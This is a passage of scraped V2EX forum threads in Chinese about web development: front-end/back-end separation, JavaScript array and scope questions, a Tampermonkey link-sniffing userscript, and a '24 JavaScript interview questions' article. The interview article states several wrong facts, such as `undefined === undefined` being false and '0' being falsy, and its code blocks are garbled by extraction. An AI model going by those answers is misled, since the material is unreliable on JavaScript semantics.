看了这个帖子后打算把 ajax 动态生成的部份改用 handlebars 实现", "我们公司正在做前后分离的尝试，但是也是分场景的。\r", "\r", "1 ，支持分离的场景。目前再分离 “个人中心”，类似后台，这块业务服务多，页面杂乱，又有几个团队负责，项目合并又很困难，分离迫在眉睫，大家要求声很高。现在渲染这块拿到前端去做，后端只需要关注自己的服务就可以了。我是支持这部分业务做分离的。\r", "\r", "2 ，不支持分离的场景\r", "\r", "还有个是纯展示的详情页。鉴于是纯展示，所以 html 代码还有 js 尽可能做的最快的展示，后端的模板又比较成熟文档，并且不会经常改动。所以这部分不太适合前后分离，但是在做业务分离的尝试。业务组件化。首先加载展示最重要的内容，其他次要的可以在浏览器渲染后 跟随用户的鼠标滑动 慢慢展示。这样既可以提高网站的负载，又不至于因为某个业务故障导致整体故障。\r", "\r", "具体分离不分离，采用什么样的技术，都是针对业务场景，开发人员的技术素质决定的。分离这事情本来就没有对与错，只是为了解决不同的问题。", "ctrl+f 了下，没有用户\"体验\"二字？", " 前端渲染有效降低用户体验", " 无限加载，瀑布流，固定的 Header/NavBar 还有各种动态闪烁效果都是我最讨厌的。无限加载总给人一种拉屎没拉干净的感觉，最不能忍；瀑布流如果是图片展示类我觉得还有存在的理由，现实是很多网站不管三七二十一就来一个瀑布流；固定 Header/NavBar 像一排赶不走的苍蝇呆在屏幕上方，抢占了有限的屏幕资源，真要用到顶部菜单的时候， iOS 轻触上面的状态栏， PC 直接按 Home 键都能快速跳过去；动态闪烁不说了，除了引起你的注意无其他卵用。上面喷的几个，可能不是前端的锅，像动不动就瀑布流这种，应该是产品经理脑残。", "1 、做 webapp 或者客户端渲染必须要前后端分离。 2 、大点的项目中间加成 nodejs ，前后端职责更加明确，个人觉得开发效率更高。 3 、一般的 web 网页的确传统的 mvc+jquery 一套就足够了。", " \r", "1. 不一定必须\r", "2. 人数变为两倍\r", "3. 大部分网页都是「一般」网页", " ", "   不复用 JSON ，复用 HTML", "我想知道这个图是用什么软件画的，楼主能告知吗 @", " Balsamiq", "前后端分离指的是架构，不是人员分工……", " 现在的前后分离架构，哪个不是人员也要分工的？", "看了大家的讨论 ", " 已经部分实现前后端分离", " \r", " \r", "\r", "搅成一团的话，不够专业，难成大器。分离是实实在在能够提高生产率的东西。比如福特汽车发明的流水线作业，就大幅提高了汽车的生产效率，把竞争对手都虐出了翔。亚当斯密在《国富论》也提出过分工的概念，建议读一读再来谈也不迟。\r", "\r", "js css html 分工我还真没仔细考虑过，但是也未必不可行。流水线上只做一个动作都可以， js,css,html 能不能分工，我持保留意见。", "做个题:\r", "当你要做一个 app,一个 pc web,一个 mobile / wechat,功能８０%重复,分离与不分离,工作量差距是多少?", " 全用 HTML 不就好了。", "我觉得这应该是“全栈”们普遍的想法", " 我是前端", "html 可能是软件行业最糟糕的一项发明。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我们知道在 <strong>js</strong> 中可以通过 Array 构造函数创建一个数组 :</p>\n<pre><code>var arr = new Array();\n</code></pre>\n<p>当我们通过在构造函数传入一个整数，就会创建 length 为对应数值的数组:</p>\n<pre><code>var arr = new Array(10);  // 创建一个长度为 10 的数组\n</code></pre>\n<p>当我们传递的是其他类型的的参数，会创建包含那个值的只有一项的数组:</p>\n<pre><code>var arr = new Array(\"10\");  // 创建一个包含 1 项，即字符串\"10\"的数组\n</code></pre>\n<p>好奇之下传入一个浮点小数：</p>\n<pre><code>var arr = new Array(10.0);  \nconsole.log(arr);\n</code></pre>\n<p>结果输出 <code>[undefined × 10]</code> ,这是为什么？数组里面的内容是什么意思？</p>\n</div></div>"], "reply": "9", "tittle": "js,新建数组问题", "comment": ["10.0 会被转换成 10 ，实际效果和 new Array(10);效果一样", "[undefined x 10] 应该是你在 chrome 的控制台看到的吧，如果在 Firefox 的 控制台可能直接显示 [undefined, undefined, ...] 等 10 个 undefined 。也就是说这里是 创建 10 个元素的数组的意思，这是由于在 js 中 10.0 跟 10 是一样的。", "new Array(10) 返回的不也是[undefined × 10] 吗？\r", "\r", "这里面有个大坑，这样创建的数组（包括仅设置 length 的数组），直接用 forEach 方法是迭代不了的。只能用 for in 数组 length 的方法。", " 哦，原来是这个意思，明白了，看到 undefinedX10 一下子没明白是什么", " \r", "果然是这样 学到了\r", "\r", "测试了一下 map/reduce/forEach/every/some 都无法遍历到 undefined 的元素 但是 find 和 for(var i = 0; i < arr.length;i++)循环可以", " 试了一下 underscore 和 lodash 好像都可以正常遍历", "稀疏数组与密集数组 \r", "\r", "对于 JS 来说，新建数组时指定数组长度貌似意义不大，多数情况下直接建个空数组就可以了。", " 学习了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近抽空写的一个简单的<code>Tampermonkey</code>JS 脚本，用于嗅探页面内所有迅雷下载链接和磁力链接,方便批量离线下载。</p>\n<h2>效果</h2>\n<p>测试页面:<a href=\"http://www.loldytt.com/Dianshiju/LJM/\" rel=\"nofollow\">http://www.loldytt.com/Dianshiju/LJM/</a></p>\n<p><a href=\"http://ww2.sinaimg.cn/large/0060lm7Tgw1f83vwiv1m6j30y20ln120.jpg\" rel=\"nofollow\"><img alt=\"\" src=\"http://ww2.sinaimg.cn/large/0060lm7Tgw1f83vwiv1m6j30y20ln120.jpg\"></a></p>\n<h2>获取脚本</h2>\n<ul>\n<li>\n<p>项目地址:<a href=\"https://gist.github.com/jae-jae/70f175342130f11df1ae7bd54b93581e\" rel=\"nofollow\" title=\"https://gist.github.com/jae-jae/70f175342130f11df1ae7bd54b93581e\">https://gist.github.com/jae-jae/70f175342130f11df1ae7bd54b93581e</a></p>\n</li>\n<li>\n<p>greasyfork 地址:<a href=\"https://greasyfork.org/zh-CN/scripts/23421-%E5%97%85%E6%8E%A2%E8%BF%85%E9%9B%B7%E9%93%BE%E6%8E%A5-jaeger\" rel=\"nofollow\" title=\"https://greasyfork.org/zh-CN/scripts/23421-%E5%97%85%E6%8E%A2%E8%BF%85%E9%9B%B7%E9%93%BE%E6%8E%A5-jaeger\">https://greasyfork.org/zh-CN/scripts/23421-%E5%97%85%E6%8E%A2%E8%BF%85%E9%9B%B7%E9%93%BE%E6%8E%A5-jaeger</a></p>\n</li>\n<li>\n<p>直接安装地址:<a href=\"https://gist.github.com/jae-jae/70f175342130f11df1ae7bd54b93581e/raw/ThunderDL.user.js\" rel=\"nofollow\" title=\"https://gist.github.com/jae-jae/70f175342130f11df1ae7bd54b93581e/raw/ThunderDL.user.js\">https://gist.github.com/jae-jae/70f175342130f11df1ae7bd54b93581e/raw/ThunderDL.user.js</a></p>\n</li>\n</ul>\n<h2>用法</h2>\n<p>Chrome 使用<code>Tampermonkey</code>插件安装好该脚本后，在任意页面按快捷键<code>alt+x</code>快捷键启动嗅探。</p>\n</div></div>"], "reply": "5", "tittle": "[Tampermonkey 脚本]嗅探页面内所有迅雷链接和磁力链接", "comment": ["看看源码嘻嘻嘻", "加个磁力链的检测好不好啊", "看错。。不好意思", "不知道怎么用呢", " 下面不是写着用法吗， Chrome 使用 Tampermonkey 插件安装好该脚本后，在任意页面按快捷键 alt+x 快捷键启动嗅探。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近在看 es6 入门教程，在函数的扩展那一章有这样一个例子：</p>\n<pre><code>var x = 1;\nfunction foo (x, y = function(){x=1;}){\n    var x = 3;\n    y();\n    console.log(x);\n    // 3 选择 javascript 选项  (书中给出的答案是这个)\n    // 1 选择 es6/babel 选项\n}\nfoo();\n</code></pre>\n<p>这个例子我是在 jsbin 上测试的，</p>\n<p>jsbin 的 js 代码填写处出可以选择 javascript 或者 es6/babel ，</p>\n<p>我选择 javascript 选项时上面的例子会输出打印 3 ，选择 es6/babel 选项时打印 1</p>\n<p>我想知道为什么这两个选项在处理 js 代码时又怎样的区别？</p>\n<p>假设以 javascript 那个选项的为标准\n这个例子为什么最后会打印出 3 ？</p>\n<p>我个人的理解是（有错误希望能指出）：赋予 y 变量的那个匿名函数在声明（定义？）时 foo 函数的作用域还未形成，也就是说在 foo 函数执行前，创建 foo 函数的执行上下文的时候，先完成 foo 函数中的参数声明，第一个参数是 X ，此时 x 赋值为 undefined ，第二个参数是 y ， y 赋值为一个匿名函数，并且这个匿名函数在这个时候被声明（定义？），此时这个匿名函数保存了自己的作用域链，这个作用域链包含它自身声明的变量及 foo 函数参数中的 x ，还有 window 的活动对象。完成了参数变量的声明和赋值后，接下来是函数声明，然后时变量声明，这时新声明的 x 将参数声明中的 x 覆盖了，所以最后打印了 3 。</p>\n</div></div>"], "reply": "6", "tittle": "javascript 的代码与 babel/es6 的代码执行时的一些问题", "comment": ["babel 转换有问题吧，默认值写匿名函数，转到 foo 里面少了 var ，覆盖了 foo 里面的 x", "事实上应该转成\r", "\r", "```\r", "var x = 1\r", "function foo(x) {\r", "    var y = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : function () {\r", "       var x = 1\r", "    }\r", "    var x = 3\r", "    y()\r", "    console.log(x)\r", "}\r", "foo()\r", "```", "看了一下， 这里的 foo 里面的 x 和  参数 y 默认值里面的 x 都是指的参数 x (也就是 undefined), 匿名函数里面对 x 赋值操作改变的是参数 x ， foo 函数里面又声明了 var x 并赋值，这里的 x 已经不是参数 x 了（去掉 var 的话就还是参数 x ）, 所以执行 y 并不会改变 foo 里面的 x", "babel 转换的时候把参数里面的匿名函数扔 foo 里面去赋值了， x 就覆盖了", " 事实上，在 es6 入门教程中，作者也是提过：函数中新声明的变量如果与参数中的变量同名，这两个变量并不相同，也就是说函数中新声明的 x 与参数变量中的 x 并不是同一个 x 。但是对于这一点我不明白的是在新声明 x 之后， y 函数任然可以操作之前的参数变量 x ，难道可以理解为在 foo 函数作用域中同时存在一个参数变量 x 和一个变量声明 x ？而 y 函数中的作用域链只保存了参数变量 x ，新声明的 x 无论怎么操作都与 y 函数作用域链中的 x 互不干扰？\r", "\r", "又或者说，参数变量 y 在赋值匿名函数时产生了闭包，导致它保存的 x 不受外界干扰？但是这样一来，假设 foo 函数中没有新声明 x ，而是直接调用 x 进行赋值操作，（将\"var x = 3\" 改成 \"x=3\"），闭包的说法也就不妥当了。", "\r", "这里可能对你有帮助，前置参数对于后面参数可见的。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><strong>1 、使用 typeof bar === \"object\" 判断 bar 是不是一个对象有神马潜在的弊端？如何避免这种弊端？</strong></p>\n<pre><code>let obj = {};\nlet arr = [];\n\nconsole.log(typeof obj === 'object');  //true\nconsole.log(typeof arr === 'object');  //true\nconsole.log(typeof null === 'object');  //true\n</code></pre>\n<blockquote>\n<p>从上面的输出结果可知， typeof bar === \"object\" 并不能准确判断 bar 就是一个 Object 。可以通过 Object.prototype.toString.call(bar) === \"[object Object]\" 来避免这种弊端：</p>\n</blockquote>\n<pre><code>let obj = {};\nlet arr = [];\n\nconsole.log(Object.prototype.toString.call(obj));  //[object Object]\nconsole.log(Object.prototype.toString.call(arr));  //[object Array]\nconsole.log(Object.prototype.toString.call(null));  //[object Null]\n\n</code></pre>\n<p><strong>2 、下面的代码会在 console 输出神马？为什么？</strong></p>\n<pre><code>(function(){\n  var a = b = 3;\n})();\n\nconsole.log(\"a defined? \" + (typeof a !== 'undefined'));   \nconsole.log(\"b defined? \" + (typeof b !== 'undefined'));\n\n</code></pre>\n<blockquote>\n<p>这跟变量作用域有关，输出换成下面的：</p>\n</blockquote>\n<pre><code>\nconsole.log(b); //3\nconsole,log(typeof a); //undefined\n\n</code></pre>\n<blockquote>\n<p>拆解一下自执行函数中的变量赋值：</p>\n</blockquote>\n<pre><code>b = 3;\nvar a = b;\n\n</code></pre>\n<blockquote>\n<p>所以 b 成了全局变量，而 a 是自执行函数的一个局部变量。</p>\n</blockquote>\n<p><strong>3 、下面的代码会在 console 输出神马？为什么？</strong></p>\n<pre><code>var myObject = {\n    foo: \"bar\",\n    func: function() {\n        var self = this;\n        console.log(\"outer func:  this.foo = \" + this.foo);\n        console.log(\"outer func:  self.foo = \" + self.foo);\n        (function() {\n            console.log(\"inner func:  this.foo = \" + this.foo);\n            console.log(\"inner func:  self.foo = \" + self.foo);\n        }());\n    }\n};\nmyObject.func();\n\n</code></pre>\n<blockquote>\n<p>第一个和第二个的输出不难判断，在 ES6 之前， JavaScript 只有函数作用域，所以 func 中的 IIFE 有自己的独立作用域，并且它能访问到外部作用域中的 self ，所以第三个输出会报错，因为 this 在可访问到的作用域内是 undefined ，第四个输出是 bar 。如果你知道闭包，也很容易解决的：</p>\n</blockquote>\n<pre><code>(function(test) {\n            console.log(\"inner func:  this.foo = \" + test.foo);  //'bar'\n            console.log(\"inner func:  self.foo = \" + self.foo);\n}(self));\n\n</code></pre>\n<blockquote>\n<p>如果对闭包不熟悉，可以戳此：从作用域链谈闭包</p>\n</blockquote>\n<p><strong>4 、将 JavaScript 代码包含在一个函数块中有神马意思呢？为什么要这么做？</strong></p>\n<blockquote>\n<p>换句话说，为什么要用立即执行函数表达式（ Immediately-Invoked Function Expression ）。</p>\n</blockquote>\n<blockquote>\n<p>IIFE 有两个比较经典的使用场景，一是类似于在循环中定时输出数据项，二是类似于 JQuery/Node 的插件和模块开发。</p>\n</blockquote>\n<pre><code>\nfor(var i = 0; i &lt; 5; i++) {\n    setTimeout(function() {\n        console.log(i);  \n    }, 1000);\n}\n\n</code></pre>\n<blockquote>\n<p>上面的输出并不是你以为的 0 ， 1 ， 2 ， 3 ， 4 ，而输出的全部是 5 ，这时 IIFE 就能有用了：</p>\n</blockquote>\n<pre><code>for(var i = 0; i &lt; 5; i++) {\n    (function(i) {\n      setTimeout(function() {\n        console.log(i);  \n      }, 1000);\n    })(i)\n}\n\n</code></pre>\n<blockquote>\n<p>而在 JQuery/Node 的插件和模块开发中，为避免变量污染，也是一个大大的 IIFE ：</p>\n</blockquote>\n<pre><code>(function($) { \n        //代码\n } )(jQuery);\n \n</code></pre>\n<p><strong>5 、在严格模式('use strict')下进行 JavaScript 开发有神马好处？</strong></p>\n<ul>\n<li>消除 Javascript 语法的一些不合理、不严谨之处，减少一些怪异行为;</li>\n<li>消除代码运行的一些不安全之处，保证代码运行的安全；</li>\n<li>提高编译器效率，增加运行速度；</li>\n<li>为未来新版本的 Javascript 做好铺垫。</li>\n</ul>\n<p><strong>6 、下面两个函数的返回值是一样的吗？为什么？</strong></p>\n<pre><code>function foo1()\n{\n  return {\n      bar: \"hello\"\n  };\n}\n\nfunction foo2()\n{\n  return\n  {\n      bar: \"hello\"\n  };\n}\n\n</code></pre>\n<blockquote>\n<p>在编程语言中，基本都是使用分号（;）将语句分隔开，这可以增加代码的可读性和整洁性。而在 JS 中，如若语句各占独立一行，通常可以省略语句间的分号（;）， JS 解析器会根据能否正常编译来决定是否自动填充分号：</p>\n</blockquote>\n<pre><code>\nvar test = 1 + 2\nconsole.log(test);  //3\n\n</code></pre>\n<blockquote>\n<p>在上述情况下，为了正确解析代码，就不会自动填充分号了，但是对于 return 、 break 、 continue 等语句，如果后面紧跟换行，解析器一定会自动在后面填充分号( ; )，所以上面的第二个函数就变成了这样：</p>\n</blockquote>\n<pre><code>function foo2()\n{\n  return;\n  {\n      bar: \"hello\"\n  };\n}\n\n</code></pre>\n<blockquote>\n<p>所以第二个函数是返回 undefined 。</p>\n</blockquote>\n<p><strong>7 、神马是 NaN ，它的类型是神马？怎么测试一个值是否等于 NaN?</strong></p>\n<blockquote>\n<p>NaN 是 Not a Number 的缩写， JavaScript 的一种特殊数值，其类型是 Number ，可以通过 isNaN(param) 来判断一个值是否是 NaN ：</p>\n</blockquote>\n<pre><code>console.log(isNaN(NaN)); //true\nconsole.log(isNaN(23)); //false\nconsole.log(isNaN('ds')); //true\nconsole.log(isNaN('32131sdasd')); //true\nconsole.log(NaN === NaN); //false\nconsole.log(NaN === undefined); //false\nconsole.log(undefined === undefined); //false\nconsole.log(typeof NaN); //number\nconsole.log(Object.prototype.toString.call(NaN)); //[object Number]\nES6 中， isNaN() 成为了 Number 的静态方法： Number.isNaN().\n\n</code></pre>\n<p><strong>8 、解释一下下面代码的输出</strong></p>\n<pre><code>console.log(0.1 + 0.2);   //0.30000000000000004\nconsole.log(0.1 + 0.2 == 0.3);  //false\n\n</code></pre>\n<blockquote>\n<p>JavaScript 中的 number 类型就是浮点型， JavaScript 中的浮点数采用 IEEE-754 格式的规定，这是一种二进制表示法，可以精确地表示分数，比如 1/2 ， 1/8 ， 1/1024 ，每个浮点数占 64 位。但是，二进制浮点数表示法并不能精确的表示类似 0.1 这样 的简单的数字，会有舍入误差。</p>\n</blockquote>\n<blockquote>\n<p>由于采用二进制， JavaScript 也不能有限表示 1/10 、 1/2 等这样的分数。在二进制中， 1/10(0.1)被表示为 0.00110011001100110011 …… 注意 0011 是无限重复的，这是舍入误差造成的，所以对于 0.1 + 0.2 这样的运算，操作数会先被转成二进制，然后再计算：</p>\n</blockquote>\n<blockquote>\n<p>0.1 =&gt; 0.0001 1001 1001 1001 …（无限循环）\n0.2 =&gt; 0.0011 0011 0011 0011 …（无限循环）</p>\n</blockquote>\n<blockquote>\n<p>双精度浮点数的小数部分最多支持 52 位，所以两者相加之后得到这么一串 0.0100110011001100110011001100110011001100...因浮点数小数位的限制而截断的二进制数字，这时候，再把它转换为十进制，就成了 0.30000000000000004 。</p>\n</blockquote>\n<p>对于保证浮点数计算的正确性，有两种常见方式。</p>\n<blockquote>\n<p>一是先升幂再降幂：</p>\n</blockquote>\n<pre><code>\nfunction add(num1, num2){\n  let r1, r2, m;\n  r1 = (''+num1).split('.')[1].length;\n  r2 = (''+num2).split('.')[1].length;\n\n  m = Math.pow(10,Math.max(r1,r2));\n  return (num1 * m + num2 * m) / m;\n}\nconsole.log(add(0.1,0.2));   //0.3\nconsole.log(add(0.15,0.2256)); //0.3756\n</code></pre>\n<p>二是是使用内置的 toPrecision() 和 toFixed() 方法，注意，方法的返回值字符串。</p>\n<pre><code>\nfunction add(x, y) {\n    return x.toPrecision() + y.toPrecision()\n}\nconsole.log(add(0.1,0.2));  //\"0.10.2\"\n\n\n</code></pre>\n<p><strong>9 、实现函数 isInteger(x) 来判断 x 是否是整数</strong></p>\n<blockquote>\n<p>可以将 x 转换成 10 进制，判断和本身是不是相等即可：</p>\n</blockquote>\n<pre><code>function isInteger(x) { \n    return parseInt(x, 10) === x; \n}\n\n\n</code></pre>\n<blockquote>\n<p>ES6 对数值进行了扩展，提供了静态方法 isInteger() 来判断参数是否是整数：</p>\n</blockquote>\n<pre><code>\nNumber.isInteger(25) // true\nNumber.isInteger(25.0) // true\nNumber.isInteger(25.1) // false\nNumber.isInteger(\"15\") // false\nNumber.isInteger(true) // false\n\n</code></pre>\n<blockquote>\n<p>JavaScript 能够准确表示的整数范围在 -2^53 到 2^53 之间（不含两个端点），超过这个范围，无法精确表示这个值。 ES6 引入了 Number.MAX_SAFE_INTEGER 和 Number.MIN_SAFE_INTEGER 这两个常量，用来表示这个范围的上下限，并提供了 Number.isSafeInteger() 来判断整数是否是安全型整数。</p>\n</blockquote>\n<p><strong>10 、在下面的代码中，数字 1-4 会以什么顺序输出？为什么会这样输出？</strong></p>\n<pre><code>\n(function() {\n    console.log(1); \n    setTimeout(function(){console.log(2)}, 1000); \n    setTimeout(function(){console.log(3)}, 0); \n    console.log(4);\n})();\n\n</code></pre>\n<blockquote>\n<p>这个就不多解释了，主要是 JavaScript 的定时机制和时间循环，不要忘了， JavaScript 是单线程的。</p>\n</blockquote>\n<p><strong>11 、写一个少于 80 字符的函数，判断一个字符串是不是回文字符串</strong></p>\n<pre><code>\nfunction isPalindrome(str) {\n    str = str.replace(/\\W/g, '').toLowerCase();\n    return (str == str.split('').reverse().join(''));\n}\n\n</code></pre>\n<p><strong>12 、写一个按照下面方式调用都能正常工作的 sum 方法</strong></p>\n<pre><code>console.log(sum(2,3));   // Outputs 5\nconsole.log(sum(2)(3));  // Outputs 5\n\n</code></pre>\n<blockquote>\n<p>针对这个题，可以判断参数个数来实现：</p>\n</blockquote>\n<pre><code>function sum() {\n  var fir = arguments[0];\n  if(arguments.length === 2) {\n    return arguments[0] + arguments[1]\n  } else {\n    return function(sec) {\n       return fir + sec;\n    }\n  }\n}\n\n</code></pre>\n<p><strong>13 、下面的代码会输出什么？为什么？</strong></p>\n<pre><code>var arr1 = \"john\".split(''); j o h n\nvar arr2 = arr1.reverse(); n h o j\nvar arr3 = \"jones\".split(''); j o n e s\narr2.push(arr3);\nconsole.log(\"array 1: length=\" + arr1.length + \" last=\" + arr1.slice(-1));\nconsole.log(\"array 2: length=\" + arr2.length + \" last=\" + arr2.slice(-1));\n</code></pre>\n<blockquote>\n<p>会输出什么呢？你运行下就知道了，可能会在你的意料之外。</p>\n</blockquote>\n<blockquote>\n<p>MDN 上对于 reverse() 的描述是酱紫的：</p>\n</blockquote>\n<pre><code>&gt;Description\nThe reverse method transposes the elements of the calling array object in place, mutating the array, and returning a reference to the array.\n</code></pre>\n<pre><code>&gt;reverse() 会改变数组本身，并返回原数组的引用。\n\n&gt;slice 的用法请参考： slice\n</code></pre>\n<p><strong>14 、下面的代码会输出什么？为什么？</strong></p>\n<pre><code>console.log(1 +  \"2\" + \"2\");\nconsole.log(1 +  +\"2\" + \"2\");\nconsole.log(1 +  -\"1\" + \"2\");\nconsole.log(+\"1\" +  \"1\" + \"2\");\nconsole.log( \"A\" - \"B\" + \"2\");\nconsole.log( \"A\" - \"B\" + 2);\n\n</code></pre>\n<blockquote>\n<p>输出什么，自己去运行吧，需要注意三个点：</p>\n</blockquote>\n<blockquote>\n<p>多个数字和数字字符串混合运算时，跟操作数的位置有关</p>\n</blockquote>\n<pre><code>console.log(2 + 1 + '3'); / /‘ 33 ’\nconsole.log('3' + 2 + 1); //'321'\n\n</code></pre>\n<blockquote>\n<p>数字字符串之前存在数字中的正负号(+/-)时，会被转换成数字</p>\n</blockquote>\n<pre><code>console.log(typeof '3');   // string\nconsole.log(typeof +'3');  //number\n\n</code></pre>\n<blockquote>\n<p>同样，可以在数字前添加 ''，将数字转为字符串</p>\n</blockquote>\n<pre><code>console.log(typeof 3);   // number\nconsole.log(typeof (''+3));  //string\n\n</code></pre>\n<blockquote>\n<p>对于运算结果不能转换成数字的，将返回 NaN</p>\n</blockquote>\n<pre><code>console.log('a' * 'sd');   //NaN\nconsole.log('A' - 'B');  // NaN\n\n</code></pre>\n<ul>\n<li>这张图是运算转换的规则</li>\n</ul>\n<p><img alt=\"运算转换的规则\" src=\"http://upload-images.jianshu.io/upload_images/2791720-570777efcfd0e4e8.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p><strong>15 、如果 list 很大，下面的这段递归代码会造成堆栈溢出。如果在不改变递归模式的前提下修善这段代码？</strong></p>\n<pre><code>var list = readHugeList();\n\nvar nextListItem = function() {\n    var item = list.pop();\n\n    if (item) {\n        // process the list item...\n        nextListItem();\n    }\n};\n\n</code></pre>\n<blockquote>\n<p>原文上的解决方式是加个定时器：</p>\n</blockquote>\n<pre><code>var list = readHugeList();\n\nvar nextListItem = function() {\n    var item = list.pop();\n\n    if (item) {\n        // process the list item...\n        setTimeout( nextListItem, 0);\n    }\n};\n\n\n</code></pre>\n<blockquote>\n<p>解决方式的原理请参考第 10 题。</p>\n</blockquote>\n<p><strong>16 、什么是闭包？举例说明</strong></p>\n<p>可以参考此篇：从作用域链谈闭包(<a href=\"http://www.ido321.com/1641.html\" rel=\"nofollow\">去看看</a>)</p>\n<p><strong>17 、下面的代码会输出什么？为啥？</strong></p>\n<pre><code>for (var i = 0; i &lt; 5; i++) {\n  setTimeout(function() { console.log(i); }, i * 1000 );\n}\n\n</code></pre>\n<blockquote>\n<p>请往前面翻，参考第 4 题，解决方式已经在上面了</p>\n</blockquote>\n<p><strong>18 、解释下列代码的输出</strong></p>\n<pre><code>console.log(\"0 || 1 = \"+(0 || 1));\nconsole.log(\"1 || 2 = \"+(1 || 2));\nconsole.log(\"0 &amp;&amp; 1 = \"+(0 &amp;&amp; 1));\nconsole.log(\"1 &amp;&amp; 2 = \"+(1 &amp;&amp; 2));\n\n</code></pre>\n<blockquote>\n<p>逻辑与和逻辑或运算符会返回一个值，并且二者都是短路运算符：</p>\n</blockquote>\n<pre><code>\n逻辑与返回第一个是 false 的操作数 或者 最后一个是 true 的操作数\nconsole.log(1 &amp;&amp; 2 &amp;&amp; 0);  //0\nconsole.log(1 &amp;&amp; 0 &amp;&amp; 1);  //0\nconsole.log(1 &amp;&amp; 2 &amp;&amp; 3);  //3\n\n\n</code></pre>\n<blockquote>\n<p>如果某个操作数为 false ，则该操作数之后的操作数都不会被计算</p>\n</blockquote>\n<pre><code>逻辑或返回第一个是 true 的操作数 或者 最后一个是 false 的操作数\nconsole.log(1 || 2 || 0); //1\nconsole.log(0 || 2 || 1); //2\nconsole.log(0 || 0 || false); //false\n\n</code></pre>\n<blockquote>\n<p>如果某个操作数为 true ，则该操作数之后的操作数都不会被计算</p>\n</blockquote>\n<pre><code>\n\n如果逻辑与和逻辑或作混合运算，则逻辑与的优先级高：\n\n\n</code></pre>\n<p>console.log(1 &amp;&amp; 2 || 0); //2\nconsole.log(0 || 2 &amp;&amp; 1); //1\nconsole.log(0 &amp;&amp; 2 || 1); //1</p>\n<pre><code>\n&gt;在 JavaScript ，常见的 false 值：\n\n\n</code></pre>\n<p>0, '0', +0, -0, false, '',null,undefined,null,NaN</p>\n<pre><code>\n&gt;要注意空数组([])和空对象({}):\n\n\n</code></pre>\n<p>console.log([] == false) //true\nconsole.log({} == false) //false\nconsole.log(Boolean([])) //true\nconsole.log(Boolean({})) //true</p>\n<pre><code>&gt;所以在 if 中，[] 和 {} 都表现为 true ：\n\n\n![]( http://upload-images.jianshu.io/upload_images/2791720-77f031aa7a2ac8ff.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n**19 、解释下面代码的输出**\n\n\n</code></pre>\n<p>console.log(false == '0')\nconsole.log(false === '0')\n请参考前面第 14 题运算符转换规则的图。</p>\n<pre><code>\n**20 、解释下面代码的输出**\n\n</code></pre>\n<p>var a={},\nb={key:'b'},\nc={key:'c'};</p>\n<p>a[b]=123;\na[c]=456;</p>\n<p>console.log(a[b]);</p>\n<pre><code>\n\n&gt;输出是 456 ，参考原文的解释：\n\n&gt;The reason for this is as follows: When setting an object property, JavaScript will implicitly stringify the parameter value. In this case, since b and c are both objects, they will both be converted to \"[object Object]\". As a result, a[b] anda[c] are both equivalent to a[\"[object Object]\"] and can be used interchangeably. Therefore, setting or referencing a[c] is precisely the same as setting or referencing a[b].\n\n**21 、解释下面代码的输出**\n\n\n</code></pre>\n<p>console.log((function f(n){return ((n &gt; 1) ? n * f(n-1) : n)})(10));</p>\n<pre><code>\n\n&gt;结果是 10 的阶乘。这是一个递归调用，为了简化，我初始化 n=5 ，则调用链和返回链如下：\n&lt;img src=\"/uploads/default/original/1X/6abf5d70cda4dcfb336335fa70d20a3ac3de163a.jpg\" width=\"372\" height=\"78\"&gt;\n\n\n**22 、解释下面代码的输出**\n\n\n</code></pre>\n<p>(function(x) {\nreturn (function(y) {\nconsole.log(x);\n})(2)\n})(1);</p>\n<pre><code>\n\n输出 1 ，闭包能够访问外部作用域的变量或参数。\n\n**23 、解释下面代码的输出，并修复存在的问题**\n\n\n</code></pre>\n<p>var hero = {\n_name: 'John Doe',\ngetSecretIdentity: function (){\nreturn this._name;\n}\n};</p>\n<p>var stoleSecretIdentity = hero.getSecretIdentity;</p>\n<p>console.log(stoleSecretIdentity());\nconsole.log(hero.getSecretIdentity());</p>\n<pre><code>\n\n&gt;将 getSecretIdentity 赋给 stoleSecretIdentity ，等价于定义了 stoleSecretIdentity 函数：\n\n\n</code></pre>\n<p>var stoleSecretIdentity =  function (){\nreturn this._name;\n}</p>\n<pre><code>\n\n&gt;stoleSecretIdentity 的上下文是全局环境，所以第一个输出 undefined 。若要输出 John Doe ，则要通过 call 、 apply 和 bind 等方式改变 stoleSecretIdentity 的 this 指向(hero)。\n\n&gt;第二个是调用对象的方法，输出 John Doe 。\n\n**24 、给你一个 DOM 元素，创建一个能访问该元素所有子元素的函数，并且要将每个子元素传递给指定的回调函数。**\n\n&gt;函数接受两个参数：\n\nDOM\n指定的回调函数\n\n原文利用 深度优先搜索(Depth-First-Search) 给了一个实现：\n</code></pre>\n<p>function Traverse(p_element,p_callback) {\np_callback(p_element);\nvar list = p_element.children;\nfor (var i = 0; i &lt; list.length; i++) {\nTraverse(list[i],p_callback);  // recursive call\n}\n}</p>\n<pre><code></code></pre>\n</div></div>"], "reply": "7", "tittle": "有必要知道的 24 个 JavaScript 面试题", "comment": ["多谢 先 mark", "好文！感谢！", "mark", "mark", "看了下有点眼熟，发现我以前也写过。。。 ", " 感谢回复 亲的那篇有的地方比我的详细些 学习了 主要是分享", "setTimeout( nextListItem, 0);为 0 有意义吗"]},
